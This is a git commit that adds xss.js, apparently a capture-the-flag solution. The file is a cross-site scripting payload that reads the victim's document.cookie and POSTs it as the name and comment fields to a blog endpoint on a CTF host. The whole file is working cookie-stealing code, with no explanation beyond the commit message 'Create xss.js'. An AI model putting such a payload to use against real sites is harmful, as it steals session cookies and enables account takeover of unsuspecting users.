905b4a0291bd6e332be1772c4c78ead8c24b609b
303sec <39656643+303sec@users.noreply.github.com>
2023-05-04 16:24:43 +0100

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,16 @@
+const cookieValue = document.cookie;
+fetch("http://blog.bc8cde18-a24.ctf.one.dr.punksecurity.cloud:5000/new-comment", {
+    "headers": {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept-language": "en-US,en;q=0.9",
+        "cache-control": "max-age=0",
+        "content-type": "application/x-www-form-urlencoded",
+        "upgrade-insecure-requests": "1"
+    },
+    "referrer": "http://blog.bc8cde18-a24.ctf.one.dr.punksecurity.cloud:5000/",
+    "referrerPolicy": "strict-origin-when-cross-origin",
+    "body": `name=${encodeURIComponent(cookieValue)}&comment=${encodeURIComponent(cookieValue)}`,
+    "method": "POST",
+    "mode": "cors",
+    "credentials": "omit"
+});
